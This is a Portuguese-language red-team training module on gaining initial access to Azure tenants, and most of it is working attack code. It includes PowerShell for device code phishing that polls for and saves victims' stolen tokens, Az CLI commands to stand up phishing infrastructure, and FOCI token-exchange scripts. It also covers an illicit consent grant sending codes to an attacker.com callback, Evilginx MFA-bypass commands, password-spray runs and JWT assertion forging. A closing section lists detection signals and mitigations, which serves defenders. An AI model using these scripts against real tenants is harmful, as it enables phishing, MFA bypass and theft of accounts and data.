---
title: "Azure Initial Access"
---

# Acesso Inicial no Azure — KC1

## O Alvo é Identidade, Não Serviço Exposto

Acesso inicial no Azure é fundamentalmente diferente de rede corporativa clássica. Não há exploração de vulnerabilidade em serviço de rede exposto — o atacante mira em **identidade** e em **tokens OAuth 2.0**. O objetivo é obter refresh token válido ou access token que permita enumerar e escalar privilégio no tenant. As técnicas do Kill Chain 1 (KC1) exploram mecanismos legítimos do OAuth 2.0 de formas não previstas pelo usuário final: Device Code Phishing abusa do Device Authorization Grant, Illicit Consent Grant abusa do Authorization Code Flow, AiTM intercepta a sessão pós-autenticação.

---

## Device Code Phishing (KC1 — Técnica Principal)

### Por Que Isso Funciona

O Device Code Flow foi criado para dispositivos sem browser (smart TVs, CLIs). O usuário autentica em outro dispositivo inserindo um código curto. O atacante explora esse fluxo ao:
1. Iniciar o flow no lado do **atacante** (não da vítima).
2. Enviar o `user_code` para a vítima via phishing.
3. A vítima autentica em páginas **100% legítimas da Microsoft**.
4. O atacante, que estava polling o endpoint `/token`, recebe os tokens da vítima.

**Vantagens críticas:**
- A vítima navega em `https://microsoft.com/devicelogin` — URL completamente legítima.
- MFA é completado pela **vítima** (o atacante herda o resultado).
- O access token vai para o dispositivo do **atacante**, não da vítima.
- O Sign-in Log registra o **IP do atacante** como dispositivo de autenticação.
- Janela de 900 segundos (15 minutos) por `device_code`.
- Client IDs de primeiro partido (Office, Teams, Az PS) têm consentimento implícito — não aparece tela de permissão.

### Fluxo Completo (Estático)

```
ATACANTE                                    MICROSOFT                          VÍTIMA
   |                                             |                               |
   |--POST /oauth2/devicecode----------------->  |                               |
   |   client_id: d3590ed6... (MS Office)        |                               |
   |   scope: .default offline_access            |                               |
   |                                             |                               |
   |<--{device_code, user_code, expires_in=900}--|                               |
   |   user_code: "EBLD8ZFJ8"                    |                               |
   |                                             |                               |
   |--[Email phishing]---------------------------------------------> VÍTIMA      |
   |   "Entre o código EBLD8ZFJ8 em             |                               |
   |    https://microsoft.com/devicelogin"       |                               |
   |                                             |                               |
   |--POST /oauth2/token (poll)----------------> |                               |
   |   grant_type: device_code                   |                               |
   |   device_code: <attacker device code>       |                               |
   |<-- {"error": "authorization_pending"}-------|                               |
   |                                             |                               |
   |                                             |<--[Vítima acessa devicelogin]-|
   |                                             |   Insere EBLD8ZFJ8            |
   |                                             |   Completa MFA                |
   |                                             |                               |
   |--POST /oauth2/token (poll)----------------> |                               |
   |<--{access_token, refresh_token, id_token}---|                               |
   |                                             |                               |
   [ATACANTE TEM OS TOKENS DA VÍTIMA]
```

### Código PowerShell — Solicitar Device Code

```powershell
# Client IDs de primeiro partido (sem necessidade de consentimento)
$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office
# $ClientId = "1b730954-1685-4b74-9bfd-dac224a7b894"  # Az PowerShell
# $ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Az CLI

$TenantId = "common"  # Ou tenant-id específico
$Resource = "https://graph.microsoft.com"

$Body = @{
    client_id = $ClientId
    scope     = "$Resource/.default offline_access openid profile"
}

$Response = Invoke-RestMethod `
    -Method Post `
    -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/devicecode" `
    -Body $Body `
    -ContentType "application/x-www-form-urlencoded"

Write-Host "[*] User Code: $($Response.user_code)"
Write-Host "[*] Verification URI: $($Response.verification_uri)"
Write-Host "[*] Message: $($Response.message)"
Write-Host "[*] Expires in: $($Response.expires_in) seconds"
Write-Host "[*] Device Code (não compartilhar): $($Response.device_code)"

# Enviar user_code + URI para a vítima via email/Teams/etc
```

### Código PowerShell — Polling para Obter Tokens

```powershell
$DeviceCode = $Response.device_code
$Interval   = $Response.interval  # Segundos entre polls (geralmente 5)

while ($true) {
    Start-Sleep -Seconds $Interval
    
    $TokenBody = @{
        grant_type  = "urn:ietf:params:oauth:grant-type:device_code"
        client_id   = $ClientId
        device_code = $DeviceCode
    }
    
    try {
        $TokenResponse = Invoke-RestMethod `
            -Method Post `
            -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
            -Body $TokenBody `
            -ContentType "application/x-www-form-urlencoded" `
            -ErrorAction Stop
        
        Write-Host "[+] ACCESS TOKEN obtido!"
        Write-Host "Access Token: $($TokenResponse.access_token)"
        Write-Host "Refresh Token: $($TokenResponse.refresh_token)"
        
        # Salvar tokens para uso posterior
        $TokenResponse | ConvertTo-Json | Out-File "stolen_tokens.json"
        break
    }
    catch {
        $ErrorContent = $_.ErrorDetails.Message | ConvertFrom-Json
        if ($ErrorContent.error -eq "authorization_pending") {
            Write-Host "[*] Aguardando autenticação da vítima..."
        }
        elseif ($ErrorContent.error -eq "expired_token") {
            Write-Host "[-] Device code expirou (900s). Tente novamente."
            break
        }
        else {
            Write-Host "[-] Erro: $($ErrorContent.error)"
            break
        }
    }
}
```

### Variante Dinâmica (Link Gera Código no Clique)

A variante estática tem um problema: se a vítima demorar mais de 15 minutos para clicar, o código expira. A variante **dinâmica** resolve isso — o link enviado para a vítima **gera um novo device_code quando clicado**, reiniciando a janela de 15 minutos.

```
Fluxo Dinâmico:

ATACANTE                    STORAGE (Static Site)        ATACANTE (polling)
   |                               |                           |
   |--[Email: "Clique aqui"]-----> |                           |
   |                               |                           |
   |                   VÍTIMA clica no link                    |
   |                               |                           |
   |           Static site JS:     |                           |
   |           1. Chama CORS-Anywhere App (App Service)        |
   |           2. App Service -> /devicecode endpoint          |
   |           3. Recebe {user_code, device_code}              |
   |           4. Mostra user_code para vítima na página       |
   |           5. Envia device_code para Function App          |
   |                                                           |
   |                               FUNCTION APP:              |
   |                               6. Inicia polling /token   |
   |                               7. Armazena tokens em      |
   |                                  Storage Table           |
```

### Infraestrutura Azure para DDC (Dynamic Device Code)

```
Componentes:
1. DDCAttackStorage  — Storage Account com Static Website habilitado
                       Hospeda a página HTML/JS de phishing
                       Storage Table para armazenar tokens coletados
                        
2. DDCAttackApp      — App Service com CORS-Anywhere
                       Proxy CORS para o /devicecode endpoint
                       (browser bloqueia CORS, App Service contorna)
                        
3. DDCAttackFunApp   — Function App (Timer ou HTTP trigger)
                       Faz polling do /token endpoint
                       Salva access_token + refresh_token na Storage Table
```

```bash
# Setup rápido via Az CLI

# 1. Storage Account com Static Website
az storage account create --name ddcattackstorage --resource-group rg-ddcattack --location eastus --sku Standard_LRS
az storage blob service-properties update --account-name ddcattackstorage --static-website --index-document index.html

# 2. App Service (CORS-Anywhere)
az appservice plan create --name ddcplan --resource-group rg-ddcattack --sku F1 --is-linux
az webapp create --name ddcattackapp --resource-group rg-ddcattack --plan ddcplan --runtime "NODE:18-lts"

# 3. Function App (Polling)
az functionapp create --name ddcattackfunapp --resource-group rg-ddcattack --storage-account ddcattackstorage --consumption-plan-location eastus --runtime powershell
```

### Ferramenta — TokenTactics

```powershell
# Instalar TokenTactics
git clone https://github.com/rvrsh3ll/TokenTactics
Import-Module .\TokenTactics.psd1

# Device Code Phishing completo (solicitar + poll automático)
Invoke-DeviceCodePhishing

# Especificar client e tenant
Invoke-DeviceCodePhishing -ClientId "d3590ed6-52b3-4102-aeff-aad2292ab01c" -Tenant "contoso.onmicrosoft.com"

# Usar refresh token para obter token para outros recursos (FOCI)
Invoke-RefreshToMSGraphToken -RefreshToken $rt -TenantId "tenant-id"
Invoke-RefreshToAzureCoreManagementToken -RefreshToken $rt -TenantId "tenant-id"
Invoke-RefreshToAzureManagementToken -RefreshToken $rt -TenantId "tenant-id"
Invoke-RefreshToOutlookToken -RefreshToken $rt -TenantId "tenant-id"
Invoke-RefreshToTeamsToken -RefreshToken $rt -TenantId "tenant-id"

# Salvar todos os tokens
Get-AzureTokens -Tenant "tenant-id"
```

---

## Family of Client IDs (FOCI) — Escalada de Escopo

### O Que É

FOCI é um conjunto de aplicações Microsoft "compatíveis" que compartilham um **Family Refresh Token (FRT)**. O FRT é um refresh token especial **não vinculado** a um `client_id` ou `scope` específico — viola diretamente a especificação OAuth 2.0, mas é uma feature deliberada da Microsoft.

**Implicação**: Com um FRT de qualquer app da família, o atacante pode obter access tokens para **qualquer outra app da família** e para **qualquer recurso**, sem novo consentimento ou autenticação.

```
Family Refresh Token (90 dias, renovável indefinidamente*)
         │
         ├──> Access Token (1h) → Microsoft Teams (ler/enviar msgs)
         ├──> Access Token (1h) → SharePoint/OneDrive (docs, arquivos)
         ├──> Access Token (1h) → Outlook/Exchange (emails, regras)
         └──> Access Token (1h) → Azure ARM (VMs, recursos, Key Vault)

* Renovável enquanto não houver reset de senha, revogação ou política de CAP
```

### Apps na Família FOCI (Client IDs)

| Aplicação | Client ID |
|-----------|-----------|
| Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
| Microsoft Teams | `1fec8e78-bce4-4aaf-ab1b-5451cc387264` |
| Az CLI | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` |
| Az PowerShell | `1b730954-1685-4b74-9bfd-dac224a7b894` |
| Microsoft Support | `9ba1a5c7-f17a-4de9-a1f1-6178c8d51223` |
| OneDrive | `ab9b8c07-8f02-4f72-87fa-80105867a763` |
| Outlook Mobile | `27922004-5251-4030-b22d-91ecd9a37ea4` |

### Limitação Importante

Embora o FRT permita mudar de `client_id` e `resource`, ele **não permite escalar roles do Entra ID**. Você não pode se tornar Global Admin apenas com um FRT — as roles são verificadas no nível do access token emitido.

```powershell
# Com refresh token do Device Code (Microsoft Office), obter token para ARM
$rt = "<refresh_token_roubado>"
$tid = "<tenant_id>"

# Trocar para Azure Management (diferente resource, mesmo FRT)
$body = @{
    grant_type    = "refresh_token"
    client_id     = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Az CLI
    refresh_token = $rt
    scope         = "https://management.azure.com/.default offline_access"
    tenant        = $tid
}

$result = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/$tid/oauth2/v2.0/token" `
    -Body $body -ContentType "application/x-www-form-urlencoded"

$result.access_token  # Token para ARM
```

---

## Illicit Consent Grant

### Como Funciona

O atacante registra uma **aplicação maliciosa** no Azure e envia um link OAuth Authorization Code para a vítima. Quando a vítima consente, a aplicação do atacante recebe um authorization code que é trocado por tokens com as permissões consentidas.

```
1. Atacante registra app no seu próprio tenant (ou usa tenant público)
2. Configura permissões desejadas (Mail.Read, Files.ReadWrite.All, etc.)
3. Gera link de autorização:
   https://login.microsoftonline.com/{tenant}/oauth2/authorize
   ?client_id={app_do_atacante}
   &response_type=code
   &redirect_uri=https://attacker.com/callback
   &scope=openid+Mail.Read+Files.ReadWrite.All
   &state=random

4. Vítima clica, vê tela de consentimento com as permissões solicitadas
5. Vítima consente → browser redireciona para redirect_uri com ?code=...
6. Atacante troca o code por access_token + refresh_token
```

```python
# Exchange authorization code for tokens
import requests

code = "0.ARo..."  # recebido no redirect
client_id = "attacker-app-client-id"
client_secret = "attacker-app-secret"
tenant_id = "victim-tenant-id"
redirect_uri = "https://attacker.com/callback"

response = requests.post(
    f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token",
    data={
        "grant_type": "authorization_code",
        "code": code,
        "client_id": client_id,
        "client_secret": client_secret,
        "redirect_uri": redirect_uri,
        "scope": "openid Mail.Read Files.ReadWrite.All offline_access"
    }
)
tokens = response.json()
print(tokens["access_token"])
print(tokens["refresh_token"])
```

**Ferramenta**: `o365-attack-toolkit` (automatiza registro + phishing + exchange)

---

## AiTM — Adversary in the Middle

### Como Funciona

O AiTM é um proxy reverso entre a vítima e o portal de login legítimo da Microsoft. A vítima pensa que está logando no Microsoft 365, mas o tráfego passa pelo servidor do atacante.

```
VÍTIMA           ATACANTE (Proxy)         MICROSOFT
  |                    |                      |
  |--[login]---------> |                      |
  |                    |--[encaminha]-------> |
  |                    |<--[página legítima]--|
  |<--[página clonada]-|                      |
  |                    |                      |
  |--[credenciais]---> |  [CAPTURA CREDS]     |
  |                    |--[encaminha]-------> |
  |                    |<--[desafio MFA]------|
  |<--[exibe MFA]-----|                      |
  |--[MFA OK]-------> |  [CAPTURA SESSION]   |
  |                    |--[encaminha]-------> |
  |                    |<--[session cookies]--|
  
  Atacante tem: credenciais + cookies de sessão pós-MFA
  Cookies de sessão = acesso sem MFA até expiração
```

**Por que bypassa MFA**: A vítima completa o MFA, e os cookies de sessão resultantes (que já satisfazem o MFA) são capturados pelo proxy.

```bash
# Evilginx3 — Ferramenta Principal para AiTM

# Instalar Evilginx3
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && make

# Configurar
./evilginx3 -p ./phishlets -developer

# No console do evilginx:
config domain attacker.com
config ipv4 1.2.3.4

# Usar phishlet do Microsoft 365
phishlets hostname o365 login.attacker.com
phishlets enable o365

# Criar lure (link de phishing)
lures create o365
lures get-url 0
# Output: https://login.attacker.com/AbCdEf

# Monitorar sessões capturadas
sessions
sessions 1  # Detalhes incluindo cookies e tokens
```

---

## Password Spray

### Ferramentas e Técnicas

```bash
# MSOLSpray — via módulo PowerShell
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList users.txt -Password "Winter2024!" -Verbose

# Spray365 — com awareness de Smart Lockout
spray365 spray --endpoint https://login.microsoft.com \
    -u userlist.txt -p "Spring2024!" --delay 60 --lockout-threshold 5

# o365spray — múltiplos módulos
o365spray --validate --domain contoso.com           # Validar domínio
o365spray --enum -U users.txt --domain contoso.com  # Enumerar usuários
o365spray --spray -U valid_users.txt -P pass.txt --domain contoso.com

# Spray via Graph API (menos ruidoso)
# POST /oauth2/token com credenciais inválidas retorna erros distintos
# AADSTS50126 = senha errada (conta existe)
# AADSTS50034 = usuário não existe
# AADSTS50057 = conta desabilitada
# AADSTS50053 = conta bloqueada
# AADSTS53004 = MFA obrigatório (mas credenciais corretas!)
```

### Smart Lockout Awareness

O Azure Smart Lockout bloqueia após múltiplas falhas. Defaults:
- Threshold: 10 tentativas falhas (padrão configurável).
- Lockout duration: 60 segundos (aumenta com cada bloqueio).
- **Observação**: Lockout é por IP. Rotacionar IPs contorna parcialmente.

---

## JWT Assertion — Autenticação via Certificado

### O Que É

A plataforma de identidade Microsoft permite que aplicações usem **JWT assertions assinados com certificado** em vez de client_secret. Se um atacante obtém acesso à chave privada de um certificado associado a uma App Registration, pode autenticar como aquela aplicação.

```
Cenário: GISApp tem permissão Read+Sign no KeyVault DataAnalyticsAppVault
         DataAnalyticsApp tem permissões elevadas no tenant

1. Como GISApp → ler certificado do DataAnalyticsAppVault
2. Usar certificado para forjar JWT assertion
3. Autenticar como DataAnalyticsApp
4. Herdar as permissões elevadas da DataAnalyticsApp
```

```powershell
# Criar JWT Assertion a partir de certificado

$cert = Get-PfxCertificate -FilePath "cert.pfx" -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)

# Construir header
$header = @{
    alg = "RS256"
    typ = "JWT"
    x5t = [Convert]::ToBase64String($cert.GetCertHash()) -replace '\+','-' -replace '/','_' -replace '='
} | ConvertTo-Json -Compress

# Construir claims
$now = [DateTimeOffset]::UtcNow
$claims = @{
    aud = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
    exp = $now.AddMinutes(10).ToUnixTimeSeconds()
    iss = $ClientId
    jti = [Guid]::NewGuid().ToString()
    nbf = $now.ToUnixTimeSeconds()
    sub = $ClientId
} | ConvertTo-Json -Compress

# Assinar com a chave privada do certificado
$headerEncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($header)) -replace '\+','-' -replace '/','_' -replace '='
$claimsEncoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($claims)) -replace '\+','-' -replace '/','_' -replace '='
$toSign = "$headerEncoded.$claimsEncoded"

$rsa = $cert.GetRSAPrivateKey()
$signature = $rsa.SignData([Text.Encoding]::UTF8.GetBytes($toSign), [Security.Cryptography.HashAlgorithmName]::SHA256, [Security.Cryptography.RSASignaturePadding]::Pkcs1)
$signatureEncoded = [Convert]::ToBase64String($signature) -replace '\+','-' -replace '/','_' -replace '='

$assertion = "$toSign.$signatureEncoded"

# Usar assertion para obter access token
$tokenBody = @{
    grant_type            = "client_credentials"
    client_id             = $ClientId
    scope                 = "https://graph.microsoft.com/.default"
    client_assertion_type = "urn:ietf:params:oauth:client-assertion-type:jwt-bearer"
    client_assertion      = $assertion
}

$token = Invoke-RestMethod -Method Post `
    -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
    -Body $tokenBody -ContentType "application/x-www-form-urlencoded"

Write-Host "Access Token: $($token.access_token)"
```

**Nota**: JWT Assertion **não bypassa** Conditional Access ou restrições de rede — essas políticas se aplicam normalmente ao service principal autenticado.

---

## Detecção e OPSEC

### Sinais no Sign-in Log para Cada Técnica

| Técnica | Sinal Detectável | Onde |
|---------|-----------------|-------|
| Device Code | Authentication Protocol: Device Code | Sign-in Logs |
| Device Code | IP do log = IP do atacante (não da vítima) | Sign-in Logs |
| Consent Grant | Novo Service Principal + App Role Assignment | Audit Logs |
| AiTM | Login de IP/ASN incomum com cookies novos | Sign-in Logs + Defender for Identity |
| Password Spray | Múltiplos AADSTS50126 de mesmo IP | Sign-in Logs (failures) |
| FOCI Token Exchange | Token refresh com client_id diferente do original | Sign-in Logs (token refresh) |

### Mitigações do Lado Defensor

- **Device Code**: CAP bloqueando "Authentication flows → Device code flow" para usuários não-privilegiados.
- **Consent Grant**: Desabilitar user consent ou requerer admin approval para todos os apps.
- **AiTM**: Phishing-resistant MFA (FIDO2, Windows Hello for Business, CBA) — não pode ser replicado por proxy.
- **Password Spray**: Smart Lockout + Identity Protection (risk-based CAP).

---

## Módulos Relacionados

`14_azure_enum_privesc.md` cobre FOCI e TokenTactics pra escalada após o acesso. `16_azure_bypass_defesas.md` aprofunda bypass de CAP. `17_azure_cicd_abuse.md` cobre GitHub Actions como vetor alternativo. `18_azure_cheatsheet.md` traz quick reference de tokens e client IDs.
